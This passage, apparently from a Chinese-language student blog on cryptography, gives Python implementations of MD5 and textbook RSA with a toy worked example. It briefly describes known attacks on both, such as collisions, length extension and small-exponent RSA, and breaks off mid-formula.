class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line"><span class="comment"># m = int(m,2)</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + F(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + G(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HH</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + H(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">II</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + I(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span><span class="params">(M)</span>:</span></span><br><span class="line"><span class="keyword">global</span> A</span><br><span class="line"><span class="keyword">global</span> B</span><br><span class="line"><span class="keyword">global</span> C</span><br><span class="line"><span class="keyword">global</span> D</span><br><span class="line"><span class="comment"># 复制前一分组的链接变量</span></span><br><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(M)):</span><br><span class="line"><span class="comment"># 第一轮循环</span></span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">7</span>,get_t(<span class="number">1</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">1</span>],<span class="number">12</span>,get_t(<span class="number">2</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">17</span>,get_t(<span class="number">3</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">3</span>],<span class="number">22</span>,get_t(<span class="number">4</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">7</span>,get_t(<span class="number">5</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">5</span>],<span class="number">12</span>,get_t(<span class="number">6</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">17</span>,get_t(<span class="number">7</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">7</span>],<span class="number">22</span>,get_t(<span class="number">8</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">7</span>,get_t(<span class="number">9</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">9</span>],<span class="number">12</span>,get_t(<span class="number">10</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">10</span>],<span class="number">17</span>,get_t(<span class="number">11</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">11</span>],<span class="number">22</span>,get_t(<span class="number">12</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">7</span>,get_t(<span class="number">13</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">13</span>],<span class="number">12</span>,get_t(<span class="number">14</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">17</span>,get_t(<span class="number">15</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">15</span>],<span class="number">22</span>,get_t(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二轮循环</span></span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">5</span>,get_t(<span class="number">17</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">6</span>],<span class="number">9</span>,get_t(<span class="number">18</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">14</span>,get_t(<span class="number">19</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">0</span>],<span class="number">20</span>,get_t(<span class="number">20</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">5</span>,get_t(<span class="number">21</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">10</span>],<span class="number">9</span>,get_t(<span class="number">22</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">14</span>,get_t(<span class="number">23</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">4</span>],<span class="number">20</span>,get_t(<span class="number">24</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">5</span>,get_t(<span class="number">25</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">14</span>],<span class="number">9</span>,get_t(<span class="number">26</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">14</span>,get_t(<span class="number">27</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">8</span>],<span class="number">20</span>,get_t(<span class="number">28</span>))</span><br><span class="line">A = GG(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">5</span>,get_t(<span class="number">29</span>))</span><br><span class="line">D = GG(D,A,B,C,M[i][<span class="number">2</span>],<span class="number">9</span>,get_t(<span class="number">30</span>))</span><br><span class="line">C = GG(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">14</span>,get_t(<span class="number">31</span>))</span><br><span class="line">B = GG(B,C,D,A,M[i][<span class="number">12</span>],<span class="number">20</span>,get_t(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三轮循环</span></span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">5</span>],<span class="number">4</span>,get_t(<span class="number">33</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">8</span>],<span class="number">11</span>,get_t(<span class="number">34</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">11</span>],<span class="number">16</span>,get_t(<span class="number">35</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">14</span>],<span class="number">23</span>,get_t(<span class="number">36</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">1</span>],<span class="number">4</span>,get_t(<span class="number">37</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">4</span>],<span class="number">11</span>,get_t(<span class="number">38</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">7</span>],<span class="number">16</span>,get_t(<span class="number">39</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">10</span>],<span class="number">23</span>,get_t(<span class="number">40</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">13</span>],<span class="number">4</span>,get_t(<span class="number">41</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">0</span>],<span class="number">11</span>,get_t(<span class="number">42</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">3</span>],<span class="number">16</span>,get_t(<span class="number">43</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">6</span>],<span class="number">23</span>,get_t(<span class="number">44</span>))</span><br><span class="line">A = HH(A,B,C,D,M[i][<span class="number">9</span>],<span class="number">4</span>,get_t(<span class="number">45</span>))</span><br><span class="line">D = HH(D,A,B,C,M[i][<span class="number">12</span>],<span class="number">11</span>,get_t(<span class="number">46</span>))</span><br><span class="line">C = HH(C,D,A,B,M[i][<span class="number">15</span>],<span class="number">16</span>,get_t(<span class="number">47</span>))</span><br><span class="line">B = HH(B,C,D,A,M[i][<span class="number">2</span>],<span class="number">23</span>,get_t(<span class="number">48</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四轮循环</span></span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">6</span>,get_t(<span class="number">49</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">7</span>],<span class="number">10</span>,get_t(<span class="number">50</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">14</span>],<span class="number">15</span>,get_t(<span class="number">51</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">5</span>],<span class="number">21</span>,get_t(<span class="number">52</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">12</span>],<span class="number">6</span>,get_t(<span class="number">53</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">3</span>],<span class="number">10</span>,get_t(<span class="number">54</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">10</span>],<span class="number">15</span>,get_t(<span class="number">55</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">1</span>],<span class="number">21</span>,get_t(<span class="number">56</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">6</span>,get_t(<span class="number">57</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">15</span>],<span class="number">10</span>,get_t(<span class="number">58</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">15</span>,get_t(<span class="number">59</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">13</span>],<span class="number">21</span>,get_t(<span class="number">60</span>))</span><br><span class="line">A = II(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">6</span>,get_t(<span class="number">61</span>))</span><br><span class="line">D = II(D,A,B,C,M[i][<span class="number">11</span>],<span class="number">10</span>,get_t(<span class="number">62</span>))</span><br><span class="line">C = II(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">15</span>,get_t(<span class="number">63</span>))</span><br><span class="line">B = II(B,C,D,A,M[i][<span class="number">9</span>],<span class="number">21</span>,get_t(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line">A = (AA + A) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">B = (BB + B) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">C = (CC + C) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">D = (DD + D) % <span class="number">2</span>**<span class="number">32</span></span><br><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(word)</span>:</span></span><br><span class="line"><span class="keyword">global</span> A,B,C,D</span><br><span class="line"><span class="comment"># 初始化链接向量</span></span><br><span class="line">A = <span class="number">0x67452301</span></span><br><span class="line">B = <span class="number">0xEFCDAB89</span></span><br><span class="line">C = <span class="number">0x98BADCFE</span></span><br><span class="line">D = <span class="number">0x10325476</span></span><br><span class="line">bintext = additonal_filling(word)</span><br><span class="line">bdata = bintext</span><br><span class="line">group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">group_mess[<span class="number">0</span>].append(<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">group_mess[<span class="number">0</span>][j] = temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>]</span><br><span class="line">step_function(group_mess)</span><br><span class="line">A = hex(A)[<span class="number">2</span>:]</span><br><span class="line">B = hex(B)[<span class="number">2</span>:]</span><br><span class="line">C = hex(C)[<span class="number">2</span>:]</span><br><span class="line">D = hex(D)[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># 按小端字节序级联输出</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> (A,B,C,D):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>//<span class="number">2</span>):</span><br><span class="line">out += item[(<span class="number">3</span>-i)*<span class="number">2</span>:(<span class="number">3</span>-i)*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">word1 = <span class="string">"iscbupt"</span></span><br><span class="line">word2 = <span class="string">"Beijing University of Posts and TelecommunicationsBeijing University of Posts and Telecommunications"</span></span><br><span class="line">word3 = <span class="string">"State Key Laboratory of Networking and Switching"</span></span><br><span class="line">word4 = <span class="string">"Hello! Bob, I'm Alice! We could communicate with each other now, It's so great!"</span></span><br><span class="line">print(word1)</span><br><span class="line">    print(encrypt(word1))</span><br><span class="line">    print(word2)</span><br><span class="line">print(encrypt(word2))</span><br></pre></td></tr></table></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/2.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    MD5算法是一种哈希算法，所以对于MD5算法的安全问题主要在于它是否具有足够的抗碰撞性。</p><p>​    在碰撞攻击方面，王小云教授研究很深入，她的成果集中在加速构造碰撞对。原来理论上构造出一个MD5碰撞对需要2^64次尝试，而现在只需要2^39次，其算法大大加速了这一过程。但从应用场景上来看，它本身并不具备太多的应用价值，因为构造出的碰撞很可能毫无意义。它的价值在于，<strong>在此算法基础上衍生出来的一系列MD5的算法，能够在部分场景下，构造出一个有意义的伪造信息，并且MD5值保持不变。</strong>所以，单单看这个算法本身就说MD5不安全，有些夸大其实。但是，后续的那些算法出现之后，MD5的安全性就真的有些令人担忧了，也就是下文要说的两种算法。 </p><ul><li><p>哈希长度扩展攻击，具体细节可以参考大牛道哥的博文 <a href="http://blog.chinaunix.net/uid-27070210-id-3255947.html" target="_blank" rel="noopener">http://blog.chinaunix.net/uid-27070210-id-3255947.html</a>，简单说来就是在已知输入M的长度（注意是长度）和其MD5值的情况下，可以在原文M后面附加任意内容，同时能够推算出新的MD5。在某些将MD5作为签名手段的系统中，攻击者可以在原文M后面随意添加内容同时能够提供正确的MD5值。 在校学习平台上就有类似的题目</p><p>存在这一问题的原因是算法使用了Merkle–Damgård construction进行数据的压缩，不止MD5，很多流行的算法都存在这个问题，比如SHA1。 </p></li><li><p>特定前缀攻击。两个不同的exe程序会在屏幕上打出不同的字符，但是他们的MD5值确是相同的，exe程序下载地址如下 <a href="https://www.cnblogs.com/A2008A/archive/2012/08/10/2631840.html" target="_blank" rel="noopener">link</a>，专家还给出了MD5碰撞快读生成器。</p></li></ul><p>面对这两个攻击，一个提高MD5安全性的有效手段是 <strong>加盐（每一个口令同一个叫做”盐“（salt）的n位随机数相关联 ）</strong>。</p><p><strong>实用性分析：</strong></p><p>​    即使MD5现在已经被证明不是百分百安全的，但是被攻破只是有限情况下的个例，对于大多数安全性要求不是很高的应用中，MD5依然拥有广泛的使用空间。MD5具有压缩性，容易计算，抗修改性和强抗碰撞性等特点，在实际应用中，其结果方便存储，在对文件加密上有很大的优势（只需要32位字符串就能对一个巨大的文件进行验证完整性 ），且加密损耗低，对性能要求较低，计算迅速。由于其不可逆的特性，在实际应用中可以用来用户密码，请求参数校验，文件校验等用途。</p><h1 id="公钥密码"><a href="#公钥密码" class="headerlink" title="公钥密码"></a>公钥密码</h1><h2 id="RSA公钥加密体制"><a href="#RSA公钥加密体制" class="headerlink" title="RSA公钥加密体制"></a>RSA公钥加密体制</h2><p>​    RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。RSA是目前最重要的网络加密算法。</p><p>算法原理：</p><blockquote><p>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难</p></blockquote><p>​    第一步</p><blockquote><p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p></blockquote><p>​    第二步</p><blockquote><p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p></blockquote><p>​    第三步</p><blockquote><p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p></blockquote><p>​    第四步</p><blockquote><p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<a href="https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8" target="_blank" rel="noopener">这里</a></p></blockquote><p>​    第五步</p><blockquote><p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p></blockquote><p>​    第六步</p><blockquote><p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p></blockquote><p>​    至此，所有准备工作完成。</p><p>​    加密和解密</p><blockquote><p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p></blockquote><p>​    假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p><blockquote><p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p></blockquote><p>​    加密</p><blockquote><p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p></blockquote><p>​    解密</p><blockquote><p>A = B^e2 mod n = 32 ，成功得到明文32！</p></blockquote><p>简单证明一下上述算法的正确性：</p><p> <em>欧拉定理</em> </p><blockquote><p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \; n）$ </p></blockquote><p>​    φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p><blockquote><p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p></blockquote><p>​    接下来要证明的就是为什么下面两个式子可以互换实现</p><blockquote><p>B=A^e1   mod n<br>A=B^e2   mod n</p></blockquote><p>​    解密规则为</p><blockquote><p>A=B^e2 mod n</p></blockquote><p>​    根据加密规则</p><blockquote><p>B = A^e1 mod n<br>B = A^e1 - kn</p></blockquote><p>​    代入解密式中</p><blockquote><p>(A^e1 - kn)^e2 ≡ A （mod n）</p></blockquote><p>​    等于证</p><blockquote><p>$A^{e1*e2} ≡ m （mod \; n）$</p></blockquote><p>​<br>由 <em>欧拉定理</em> 可以得到</p><blockquote><p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p></blockquote><p>​    代入前面的式子可以得到</p><blockquote><p>$A^{hφ（n）+1} \; ≡ m (mod\;n)$</p></blockquote><p>​    上式恒成立，则算法正确性得证。</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line"><span class="keyword">if</span> int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">text += chr(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastExpMod</span><span class="params">(b, e, m)</span>:</span></span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (e&amp;<span class="number">1</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># ei = 1, then mul</span></span><br><span class="line">            result = (result * b) % m</span><br><span class="line">        e &gt;&gt;= <span class="number">1</span></span><br><span class="line">        b = (b*b) % m</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数,输入为plain字符明文，n，e</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_encrypt</span><span class="params">(plain)</span>:</span></span><br><span class="line"><span class="keyword">global</span> n</span><br><span class="line"><span class="keyword">global</span> e</span><br><span class="line"><span class="comment"># 将明文转为比特串</span></span><br><span class="line">bitplian = str2bin(plain)</span><br><span class="line">group_len = int(math.log(n,<span class="number">2</span>)) - <span class="number">1</span> </span><br><span class="line">arr_group = []</span><br><span class="line"><span class="keyword">if</span> (len(bitplian) % group_len) != <span class="number">0</span>:</span><br><span class="line">bitplian += <span class="string">"0"</span>*(group_len-(len(bitplian) % group_len))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitplian) // group_len):</span><br><span class="line">arr_group.append(bitplian[i*group_len:i*group_len+group_len])</span><br><span class="line">cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line">ci = fastExpMod(int(item,<span class="number">2</span>),e,n)</span><br><span class="line">cipher += <span class="string">f'<span class="subst">&#123;bin(ci)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len+<span class="number">2</span>&#125;</span>&#125;'</span></span><br><span class="line"><span class="keyword">return</span> hex(int(cipher,<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数，输入为cipehr16进制密文，n，d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(cipher)</span>:</span></span><br><span class="line"><span class="keyword">global</span> n</span><br><span class="line"><span class="keyword">global</span> d</span><br><span class="line">bitcipher = bin(int(cipher,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">temp_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span> </span><br><span class="line"><span class="keyword">if</span> (len(bitcipher) % temp_len) != <span class="number">0</span>:</span><br><span class="line">bitcipher = <span class="string">"0"</span>*(temp_len - (len(bitcipher) % temp_len)) + bitcipher</span><br><span class="line">group_len = int(math.log(n,<span class="number">2</span>)) + <span class="number">1</span></span><br><span class="line">arr_group = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bitcipher) // group_len):</span><br><span class="line">arr_group.append(bitcipher[i*group_len:i*group_len+group_len])</span><br><span class="line">bitplain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> arr_group:</span><br><span class="line"><span class="comment"># mi = (int(item,2)**d % n)</span></span><br><span class="line">mi = fastExpMod(int(item,<span class="number">2</span>),d,n)</span><br><span class="line">bitplain += <span class="string">f'<span class="subst">&#123;bin(mi)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;group_len<span class="number">-2</span>&#125;</span>&#125;'</span></span><br><span class="line"><span class="keyword">return</span> bin2str(bitplain)</span><br><span class="line"></span><br><span class="line">p = <span class="number">2147483647</span></span><br><span class="line">q = <span class="number">1000000007</span></span><br><span class="line">n = p * q</span><br><span class="line">pi_n = (p<span class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = int(gp.invert(e,pi_n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">mode = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">'e'</span>:</span><br><span class="line">plain = input(<span class="string">"Plz input message: "</span>)</span><br><span class="line">cipher = rsa_encrypt(plain)</span><br><span class="line">print(<span class="string">"cipher: "</span>, cipher)</span><br><span class="line"><span class="keyword">elif</span> mode == <span class="string">'d'</span>:</span><br><span class="line">cipher = input(<span class="string">"Plz input cipher: "</span>)</span><br><span class="line">plain = rsa_decrypt(cipher)</span><br><span class="line">print(<span class="string">"plain: "</span>,plain)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><strong>实例演示：</strong></p><p><img src="/2019/01/15/crypto2/2.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    到目前为止，世界上还没有任何可靠的攻击RSA算法的方式 。然而即便RSA算法目前来说是安全可靠的，<strong>但是错误的应用场景，错误的环境配置，以及错误的使用方法，都会导致RSA的算法体系出现问题</strong>，从而也派生出针对各种特定场景下的RSA攻击方法。 此处指简单列举一些攻击方法</p><ul><li><p>直接分解n。一般这种情况是由于n较小，或者使用已经使用过的p、q造成的，这样会造成RSA直接被破解</p></li><li><p>低加密指数攻击。当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。 </p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><p>即：</p></li></ul><blockquote><script type="math/tex; mode=display">cequiv m^e mod n</script></blockquote><p>  如果e=3，且$ m^e&lt;{n} $，那么：</p><blockquote><p>​                        $ c= m^e,$ $e=3$</p><p> ​                        $ 